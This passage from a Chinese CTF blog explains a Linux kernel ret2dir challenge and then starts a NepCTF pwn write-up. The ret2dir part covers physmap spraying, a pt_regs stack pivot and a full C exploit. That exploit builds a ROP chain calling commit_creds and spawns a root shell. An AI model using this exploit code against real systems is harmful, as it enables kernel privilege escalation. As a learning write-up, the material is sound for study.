class="type">void</span>)</span><br><span class="line">.text.unlikely:<span class="number">000000000000011F</span> <span class="number">48</span> C7 C7 <span class="number">70</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     __file, offset unk_370</span><br><span class="line">.text.unlikely:<span class="number">0000000000000126</span> <span class="number">48</span> <span class="number">89</span> DE                      mov     cmd, kgadget_ptr</span><br><span class="line">.text.unlikely:<span class="number">0000000000000129</span> E8 <span class="number">2</span>A <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000129</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000012</span>E <span class="number">48</span> C7 C7 A0 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     rdi, offset unk_3A0</span><br><span class="line">.text.unlikely:<span class="number">0000000000000135</span> E8 <span class="number">1</span>E <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000135</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000013</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">65</span> E8                   mov     [rbp<span class="number">-18</span>h], rsp</span><br><span class="line">.text.unlikely:<span class="number">000000000000013</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp<span class="number">-18</span>h]</span><br><span class="line">.text.unlikely:<span class="number">0000000000000142</span> <span class="number">48</span> C7 C7 F8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     rdi, offset unk_3F8</span><br><span class="line">.text.unlikely:<span class="number">0000000000000149</span> <span class="number">48</span> <span class="number">05</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span>             add     rax, <span class="number">1000</span>h</span><br><span class="line">.text.unlikely:<span class="number">000000000000014F</span> <span class="number">48</span> <span class="number">25</span> <span class="number">00</span> F0 FF FF             and     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000155</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">90</span> <span class="number">58</span> FF FF FF          lea     rdx, [rax<span class="number">-0</span>A8h]</span><br><span class="line">.text.unlikely:<span class="number">000000000000015</span>C <span class="number">48</span> <span class="number">89</span> <span class="number">55</span> E8                   mov     [rbp<span class="number">-18</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000160</span>                               regs = rdx                              ; pt_regs *</span><br><span class="line">.text.unlikely:<span class="number">0000000000000160</span> <span class="number">48</span> BA <span class="number">61</span> <span class="number">72</span> <span class="number">74</span> <span class="number">74</span> <span class="number">6</span>E <span class="number">62</span> <span class="number">61</span> <span class="number">33</span> mov     regs, <span class="string">&#x27;3abnttra&#x27;</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000016</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">58</span> FF FF FF          mov     [rax<span class="number">-0</span>A8h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000171</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">60</span> FF FF FF          mov     [rax<span class="number">-0</span>A0h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000178</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">68</span> FF FF FF          mov     [rax<span class="number">-98</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">000000000000017F</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">70</span> FF FF FF          mov     [rax<span class="number">-90</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000186</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">78</span> FF FF FF          mov     [rax<span class="number">-88</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">000000000000018</span>D <span class="number">48</span> <span class="number">89</span> <span class="number">50</span> <span class="number">80</span>                   mov     [rax<span class="number">-80</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000191</span> <span class="number">48</span> <span class="number">89</span> <span class="number">50</span> <span class="number">90</span>                   mov     [rax<span class="number">-70</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000195</span> E8 BE <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000195</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000019</span>A E8 B1 <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>                call    __x86_indirect_thunk_rbx        ; PIC mode</span><br></pre></td></tr></table></figure><p>会把ioctl第三个参数里的值当作函数指针去调用，所以可以在用户态布置提权rop链，同时我们可以在内核态从线性映射区那里访问到嘛，利用mmap申请且布置很多gadget内核访问到的机率就大的多</p><blockquote><p>可以mmap申请后，gdb里用find命令去找下，验证下内核访问</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find 0xffff888000000000,+0x10000000,&quot;target strings&quot;</span><br></pre></td></tr></table></figure></blockquote><p>现在需要解决的一个问题就是怎么把栈迁移到可以访问到用户态的线性映射区?</p><p><strong>先了解下一点没开kpit时的syscall(开了pit还需要切换cr3，换页表)</strong></p><p>syscall会把syscall的下一条指令地址即rip保存到rcx，rflags保存到 r11中，后执行到entry_SYSCALL_64 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"> <span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>通过一系列的push在内核栈上形成一个pt_regs结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* arch/x86/include/asm/ptrace.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们可以在用户态控制这部分寄存器值，从而控制内核栈上的值，然后通过<code>add rsp,val,ret和pop rsp，ret</code>来实现栈迁移</p><p>本题里除r8，r9寄存器其余都被破坏了，不过两个寄存器也够了</p><p>先利用<code>add rsp,val,ret</code>把栈降到r9寄存器的位置，r9寄存器里存放<code>pop rsp,ret</code>的gadget，<code>pop rsp</code>完成栈迁移到r8里的值,ret执行迁移处的内容，所以r8里就存猜测的physmap地址</p><p>用下面的代码测试，断点断到最后执行 call __x86_indirect_thunk_rbx的ret</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    &quot;mov r15,   0xbeefdead;&quot;</span><br><span class="line">    &quot;mov r14,   0x11111111;&quot;</span><br><span class="line">    &quot;mov r13,   0x22222222;&quot;</span><br><span class="line">    &quot;mov r12,   0x33333333;&quot;</span><br><span class="line">    &quot;mov rbp,   0x44444444;&quot;</span><br><span class="line">    &quot;mov rbx,   0x55555555;&quot;</span><br><span class="line">    &quot;mov r11,   0x66666666;&quot;</span><br><span class="line">    &quot;mov r10,   0x77777777;&quot;</span><br><span class="line">    &quot;mov r9,    0x999999999;&quot;   </span><br><span class="line">    &quot;mov r8,    0x888888888;&quot;</span><br><span class="line">    &quot;mov rax,   0x10;&quot;</span><br><span class="line">    &quot;mov rcx,   0xaaaaaaaa;&quot;</span><br><span class="line">    &quot;mov rdx,   0x33;&quot;</span><br><span class="line">    &quot;mov rsi,   0x1bf52;&quot;</span><br><span class="line">    &quot;mov rdi,   fd;&quot;</span><br><span class="line">    &quot;syscall&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>__x86_indirect_thunk_rbx最后实现调用</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230823153602727.png" alt="image-20230823153602727"></p></blockquote><p><img src="/2023/08/22/kernel-ret2dir/image-20230823153135353.png" alt="image-20230823153135353"></p><p>所以需要add rsp, 0xc0，找到了一条平替的gadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xffffffff810737fe: add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret;</span><br></pre></td></tr></table></figure><p>由于开了pti，提权后返回用户态起rootshell前需要切换cr3</p><p>内核空间的PGD和用户空间的PGD连续的放置在一个8KB的内存空间中（内核态在低位，用户态在高位）。这段空间必须是8K对齐的，这样将CR3的切换操作转换为将CR3值的第13位(由低到高)的置位或清零操作，提高了CR3切换的速度。</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230823181758556.png" alt="image-20230823181758556"></p><p>切换到用户页表把第13位置1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;SWITCH_USER_CR3</span><br><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, 1000h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><p>没有合适gadget来利用</p><p>由于没开kaslr，可以用swapgs_restore_regs_and_return_to_usermode函数来返回,这里从恢复的vmlinux看的话，vmlinux应该是恢复的有点问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble swapgs_restore_regs_and_return_to_usermode                                                                                                                                                </span><br><span class="line">Dump of assembler code for function swapgs_restore_regs_and_return_to_usermode:    </span><br><span class="line">0xffffffff81c00fb0 &lt;+0&gt;:     nop    DWORD PTR [rax+rax*1+0x0] </span><br><span class="line">0xffffffff81c00fb5 &lt;+5&gt;:     pop    r15                    </span><br><span class="line">0xffffffff81c00fb7 &lt;+7&gt;:     pop    r14 </span><br><span class="line">0xffffffff81c00fb9 &lt;+9&gt;:     pop    r13     </span><br><span class="line">0xffffffff81c00fbb &lt;+11&gt;:    pop    r12</span><br><span class="line">0xffffffff81c00fbd &lt;+13&gt;:    pop    rbp</span><br><span class="line">0xffffffff81c00fbe &lt;+14&gt;:    pop    rbx</span><br><span class="line">0xffffffff81c00fbf &lt;+15&gt;:    pop    r11</span><br><span class="line">0xffffffff81c00fc1 &lt;+17&gt;:    pop    r10</span><br><span class="line">0xffffffff81c00fc3 &lt;+19&gt;:    pop    r9</span><br><span class="line">0xffffffff81c00fc5 &lt;+21&gt;:    pop    r8</span><br><span class="line">0xffffffff81c00fc7 &lt;+23&gt;:    pop    rax</span><br><span class="line">0xffffffff81c00fc8 &lt;+24&gt;:    pop    rcx</span><br><span class="line">0xffffffff81c00fc9 &lt;+25&gt;:    pop    rdx</span><br><span class="line">0xffffffff81c00fca &lt;+26&gt;:    pop    rsi;直到这里恢复一些当时中断保存的pt_regs寄存器组</span><br><span class="line">0xffffffff81c00fcb &lt;+27&gt;:    mov    rdi,rsp;一般返回用户态起shll的rop直接返回这里即可</span><br><span class="line">0xffffffff81c00fce &lt;+30&gt;:    mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81c00fd7 &lt;+39&gt;:    push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81c00fda &lt;+42&gt;:    push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81c00fdd &lt;+45&gt;:    push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81c00fe0 &lt;+48&gt;:    push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81c00fe3 &lt;+51&gt;:    push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81c00fe6 &lt;+54&gt;:    push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81c00fe8 &lt;+56&gt;:    push   rax</span><br><span class="line">0xffffffff81c00fe9 &lt;+57&gt;:    xchg   ax,ax</span><br><span class="line">0xffffffff81c00feb &lt;+59&gt;:    mov    rdi,cr3</span><br><span class="line">0xffffffff81c00fee &lt;+62&gt;:    jmp    0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;</span><br><span class="line">......</span><br><span class="line">0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;: or     rdi,0x1000;恢复用户态PGD</span><br><span class="line">0xffffffff81c0102b &lt;swapgs_restore_regs_and_return_to_usermode+123&gt;: mov    cr3,rdi</span><br><span class="line">0xffffffff81c0102e &lt;swapgs_restore_regs_and_return_to_usermode+126&gt;: pop    rax</span><br><span class="line">0xffffffff81c0102f &lt;swapgs_restore_regs_and_return_to_usermode+127&gt;: pop    rdi</span><br><span class="line">0xffffffff81c01030 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;: swapgs </span><br><span class="line">0xffffffff81c01033 &lt;swapgs_restore_regs_and_return_to_usermode+131&gt;: jmp    0xffffffff81c01060 &lt;native_iret&gt;</span><br><span class="line">......</span><br><span class="line">0xffffffff81c01060 &lt;native_iret&gt;:    test   BYTE PTR [rsp+0x20],0x4;需要不相等，一般满足</span><br><span class="line">0xffffffff81c01065 &lt;native_iret+5&gt;:  jne    0xffffffff81c01069 &lt;native_irq_return_ldt&gt;</span><br><span class="line">0xffffffff81c01067 &lt;native_irq_return_iret&gt;: iretq</span><br></pre></td></tr></table></figure><p>切换了用户态的页表和gs寄存器，多pop了rax和rdi，所以提权rop链变为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rsp  ----&gt;  swapgs_restore_regs_and_return_to_usermode::mov_rdi_rsp</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">            <span class="number">0</span></span><br><span class="line">            get root shell</span><br><span class="line">            cs</span><br><span class="line">            rflags</span><br><span class="line">            rsp</span><br><span class="line">            ss</span><br></pre></td></tr></table></figure><p>physmap里最后的形式就是下面这样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">------------------------</span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret</span><br><span class="line">...</span><br><span class="line">add rsp, val ; ret # 该gadget必定会命中下一个区域中的一条ret，之后便能平缓地“滑”到常规的提权 rop 上</span><br><span class="line">------------------------</span><br><span class="line">ret</span><br><span class="line">ret</span><br><span class="line">...</span><br><span class="line">ret</span><br><span class="line">------------------------</span><br><span class="line">common root ROP chain</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xc0 = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs = <span class="number">0xffffffff81c0129c</span>;</span><br><span class="line"><span class="type">size_t</span> iret_poprbp = <span class="number">0xffffffff8103ba65</span>;</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">constructROPChain</span><span class="params">(<span class="type">size_t</span> *rop)</span> &#123;</span><br><span class="line">  <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); idx++)</span><br><span class="line">    rop[idx] = add_rsp_0xc0;</span><br><span class="line">  <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); idx++)</span><br><span class="line">    rop[idx] = ret;</span><br><span class="line">  rop[idx++] = pop_rdi_ret;</span><br><span class="line">  rop[idx++] = init_cred;</span><br><span class="line">  rop[idx++] = commit_creds;</span><br><span class="line">  rop[idx++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">  rop[idx++] = <span class="number">0</span>;</span><br><span class="line">  rop[idx++] = <span class="number">0</span>;</span><br><span class="line">  rop[idx++] = (<span class="type">size_t</span>)spawn_shell;</span><br><span class="line">  rop[idx++] = user_cs;</span><br><span class="line">  rop[idx++] = user_rflags;</span><br><span class="line">  rop[idx++] = user_sp;</span><br><span class="line">  rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_status();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open  error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">  physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  constructROPChain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">    physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                                MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!physmap_spray_arr[i]) &#123;</span><br><span class="line">      perror(<span class="string">&quot;Mmap Failed!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">  &#125;</span><br><span class="line">  guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">  __asm__(<span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r9,    pop_rsp_ret;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r8,    guess;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rdx,   guess;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rdi,   fd;&quot;</span></span><br><span class="line">          <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/22/kernel-ret2dir/image-20230828094130225.png" alt="image-20230828094130225"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/560805991">https://zhuanlan.zhihu.com/p/560805991</a></li><li><a href="https://zhuanlan.zhihu.com/p/137277724">https://zhuanlan.zhihu.com/p/137277724</a></li><li><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 NepCTF pwn</title>
      <link href="/2023/08/17/2023NepCTF/"/>
      <url>/2023/08/17/2023NepCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/srop&gt; checksec pwn</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/nepctf/srop/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/srop&gt; seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>签到题，srop或者ret2csu都能打</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span 